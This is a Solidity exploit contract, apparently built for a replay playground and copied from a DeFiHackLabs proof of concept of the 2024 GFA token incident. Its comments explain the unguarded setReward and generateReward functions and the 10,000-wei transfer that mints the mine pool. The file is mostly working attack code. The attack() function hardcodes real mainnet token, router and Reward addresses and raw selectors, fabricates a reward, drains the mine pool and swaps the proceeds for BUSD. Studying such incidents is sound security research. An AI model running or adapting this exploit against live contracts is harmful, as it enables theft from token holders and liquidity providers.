// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-04-GFA).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (`Exploit is Test`, `address(this)` is the attacker throughout) — there is no
// standalone attack contract to deploy. This is a faithful, self-contained copy
// of that inline attack (attack() + swap_token_to_token()) so the playground can
// deploy it and record attack(). Logic and constants are copied verbatim from
// test/GFA_exp.sol in the registry. The only change is the seed: the original
// test's setUp() does `deal(BUSD, address(this), 30e18)` before testExploit()
// runs; here the same 30 BUSD is seeded into this contract via the config's
// `setup.steps` dealToken instead of a Foundry cheatcode.
//
// Root cause: GFA's coupled `Reward` bookkeeper contract exposes setReward(),
// generateReward(), and releaseCoin() as PUBLIC with no onlyToken/onlyOwner
// guard. Calling setReward() directly lets anyone fabricate a pending reward
// entry with an arbitrary amount/remain/price with zero collateral;
// generateReward() then matures it into a `waitRelease` balance (capped at the
// fabricated `remain`, here 40,000,000 GFA). Sending the token a magic
// `releaseAmount = 10000`-wei transfer triggers the token's claim branch, which
// trusts the Reward contract's `waitRelease` figure and mints real GFA out of
// the token's 8,000,000-GFA mine-pool distributor to the caller (capped only by
// the distributor's own balance, not by anything the caller ever deposited).
// The freshly minted 8,000,000 GFA is then dumped into the GFA/BUSD pool for
// real BUSD profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract GFAExploit {
    IERC20 private constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant GFA = IERC20(0x278ce7151Bfd1b035e8Bc99e15b4d9773969D4eD);
    IPancakeRouter private constant Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address private constant Reward = 0xbCbCb0e7E28414e084c4a40C1cCC30B75629a7DE;

    // Faithful copy of test/GFA_exp.sol's attack(): buy a small amount of GFA
    // (funded here via a pre-seeded 30 BUSD balance instead of Foundry's
    // deal()), fabricate + mature a reward entitlement on the unprotected
    // Reward bookkeeper, trigger the token's claim path with the magic
    // 10,000-wei transfer (mints the entire 8,000,000-GFA mine pool to this
    // contract), then dump all the GFA back into the pool for BUSD.
    function attack() external {
        BUSD.approve(address(Router), type(uint256).max);
        swap_token_to_token(address(BUSD), address(GFA), 30 ether);

        // setReward(address rewardSender, uint256 amount, uint256 remain, uint256 price)
        Reward.call(
            abi.encodeWithSelector(bytes4(0x5f7938f1), address(this), 400_000_000 * 1e18, 40_000_000 * 1e18, 12_222)
        );
        // generateReward(uint256 coinPrice)
        Reward.call(abi.encodeWithSelector(bytes4(0x3890ec92), 100));

        // Magic releaseAmount transfer triggers the token's claim branch,
        // minting the mine-pool balance (capped there) to this contract.
        GFA.transfer(address(GFA), 10_000);

        swap_token_to_token(address(GFA), address(BUSD), GFA.balanceOf(address(this)));
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }
}
